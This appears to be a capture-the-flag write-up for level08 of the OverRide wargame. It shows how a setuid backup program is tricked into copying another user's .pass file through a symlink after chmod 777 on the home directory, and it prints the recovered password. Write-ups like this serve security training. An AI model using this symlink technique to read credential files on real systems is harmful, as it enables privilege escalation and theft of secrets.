Trying to run our program without any arguments will result in an error message.
Getting an error message:
```
ERROR: Failed to open (null)
level08@OverRide:~$
```
After exploring in gdb, we have an understanding of workflow. Program ment to make a backup of file and log it's actions.
So there is static path to `./backups/` directory and we can't change it. But we can use path traversal or symlink to get access to the file we want to read.
So we can create symlink `pass` to level09 `.pass` file and run program with argument `pass` to get the password.
```
level08@OverRide:~$ ln -s /home/users/level09/.pass pass
ln: failed to create symbolic link `pass': Permission denied
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s /home/users/level09/.pass pass
```
And after creation just run program with argument `pass` and look into `./backups/pass` file.
```
level08@OverRide:~$ ./level08 pass
level08@OverRide:~$ cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
We're done here.